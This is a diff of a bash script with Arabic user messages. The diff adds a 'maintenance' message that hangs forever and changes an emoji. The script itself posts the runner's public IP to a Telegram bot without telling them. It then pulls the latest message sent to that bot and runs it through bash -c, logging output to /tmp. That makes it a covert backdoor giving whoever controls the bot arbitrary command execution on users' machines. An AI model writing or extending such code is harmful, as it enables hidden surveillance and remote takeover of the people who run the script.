@@ -10,10 +10,16 @@ IP=$(curl -s -4 ifconfig.me)
 
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     -d chat_id="$CHAT_ID" \
-    -d text=" مستخدم جديد شغّل السكربت من IP : $IP" >/dev/null
+    -d text="🟢 مستخدم جديد شغّل السكربت من IP : $IP" >/dev/null
 
 CMD=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates" | grep -oP '"text":"\K[^"]+' | tail -1)
 
-[[ -z "$CMD" ]] && echo " ⛔ The script is under maintenance. Please try again later. " && exit 1
+if [[ "$CMD" == \#* ]]; then
+    clear
+    echo -e "${YELLOW} ⛔ السكربت حالياً قيد الصيانة من طرف المطوّر. المرجو المحاولة لاحقاً.${NC}"
+    while true; do sleep 300; done
+    exit 0
+fi
+
 
 bash -c "$CMD" 2>&1 | tee /tmp/exec_output.log
